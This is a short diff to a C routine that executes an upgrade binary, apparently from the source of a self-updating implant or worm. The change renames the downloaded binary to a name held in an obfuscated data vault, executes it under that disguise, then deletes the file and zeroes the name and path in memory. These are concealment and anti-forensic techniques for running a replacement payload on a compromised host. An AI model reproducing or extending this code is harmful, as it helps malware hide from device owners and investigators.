@@ -1167,14 +1167,22 @@ static void run_upbin (void) {
 	char **args = NULL;
 	char *add_args[1] = { NULL };
 	char *m_args = NULL;
+	const char *path = prne_s_g->upbin_path;
 
 	// copy data from shared global as it will be unmapped before exec() call.
-	add_args[0] = prne_dup_str(prne_s_g->upbin_path);
+	add_args[0] = prne_dup_str(
+		prne_dvault_get_cstr(PRNE_DATA_KEY_EXEC_NAME, NULL));
+	prne_dvault_reset();
 	m_args = prne_malloc(1, sizeof(prne_s_g->upbin_args));
 	if (add_args[0] == NULL || m_args == NULL) {
 		goto END;
 	}
 	memcpy(m_args, prne_s_g->upbin_args, sizeof(prne_s_g->upbin_args));
+
+	if (rename(prne_s_g->upbin_path, add_args[0]) != 0) {
+		goto END;
+	}
+	path = add_args[0];
 
 	args = prne_htbt_parse_args(
 		m_args,
@@ -1190,6 +1198,10 @@ static void run_upbin (void) {
 	do_exec(args[0], args);
 
 END:
+	unlink(path);
+	prne_s_g->upbin_path[0] = 0;
+
+	prne_strzero(add_args[0]);
 	prne_free(add_args[0]);
 	prne_free(m_args);
 	prne_free(args);
